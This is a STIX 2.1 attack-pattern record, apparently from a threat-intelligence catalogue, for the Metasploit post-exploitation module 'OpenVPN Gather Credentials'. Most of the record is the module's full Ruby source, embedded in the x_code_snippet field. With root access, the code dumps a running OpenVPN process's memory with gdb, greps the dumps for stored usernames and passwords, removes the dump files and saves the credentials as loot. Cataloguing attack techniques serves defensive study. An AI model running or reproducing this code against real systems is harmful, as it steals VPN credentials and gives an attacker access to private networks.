{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--42b48a7a-660e-4e1e-8370-226653cd828f",
    "created": "2024-08-14T16:33:15.123431Z",
    "modified": "2024-08-14T16:33:15.123434Z",
    "name": "OpenVPN Gather Credentials",
    "description": " This module grab OpenVPN credentials from a running process in Linux.  Note: --auth-nocache must not be set in the OpenVPN command line.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/openvpn_credentials.rb",
            "external_id": "openvpn_credentials.rb"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/rvrsh3ll/cc93a0e05e4f7145c9eb#file-openvpnscraper-sh"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OpenVPN Gather Credentials',\n        'Description' => %q{\n          This module grab OpenVPN credentials from a running process\n          in Linux.\n\n          Note: --auth-nocache must not be set in the OpenVPN command line.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'rvrsh3ll', # Discovery\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>', # Metasploit Module\n        ],\n        'Platform' => ['linux'],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'References' => [\n          ['URL', 'https://gist.github.com/rvrsh3ll/cc93a0e05e4f7145c9eb#file-openvpnscraper-sh']\n        ]\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('PID', [true, 'Process IDentifier to OpenVPN client.']),\n        OptString.new('TMP_PATH', [true, 'The path to the directory to save dump process', '/tmp/'])\n      ], self.class\n    )\n  end\n\n  def pid\n    datastore['PID']\n  end\n\n  def tmp_path\n    datastore['TMP_PATH']\n  end\n\n  def run\n    user = cmd_exec('/usr/bin/whoami')\n    print_good(\"Module running as \\\"#{user}\\\" user\")\n\n    unless is_root?\n      print_error('This module requires root permissions.')\n      return\n    end\n\n    dump = cmd_exec('/bin/grep rw-p /proc/'\"#{pid}\"'/maps | sed -n \\'s/^\\([0-9a-f]*\\)-\\([0-9a-f]*\\) .*$/\\1 \\2/p\\' | while read start stop; do /usr/bin/gdb --batch-silent --silent --pid '\"#{pid}\"' -ex \"dump memory '\"#{tmp_path}#{pid}\"'-$start-$stop.dump 0x$start 0x$stop\"; done 2>/dev/null; echo $?')\n    if dump.chomp.to_i == 0\n      vprint_good('Succesfully dump.')\n    else\n      print_warning('Could not dump process.')\n      return\n    end\n\n    strings = cmd_exec(\"/usr/bin/strings #{tmp_path}*.dump | /bin/grep -B2 KnOQ  | /bin/grep -v KnOQ | /usr/bin/column | /usr/bin/awk '{print \\\"User: \\\"$1\\\"\\\\nPass: \\\"$2}'\")\n\n    deldump = cmd_exec(\"/bin/rm #{tmp_path}*.dump --force 2>/dev/null; echo $?\")\n    if deldump.chomp.to_i == 0\n      vprint_good('Removing temp files successfully.')\n    else\n      print_warning('Could not remove dumped files. Remove manually.')\n    end\n\n    fail_with(Failure::BadConfig, 'No credentials. You can check if the PID is correct.') if strings.empty?\n\n    vprint_good(\"OpenVPN Credentials:\\n#{strings}\")\n\n    p = store_loot(\n      'openvpn.grab',\n      'text/plain',\n      session,\n      strings,\n      nil\n    )\n    print_status(\"OpenVPN Credentials stored in #{p}\")\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}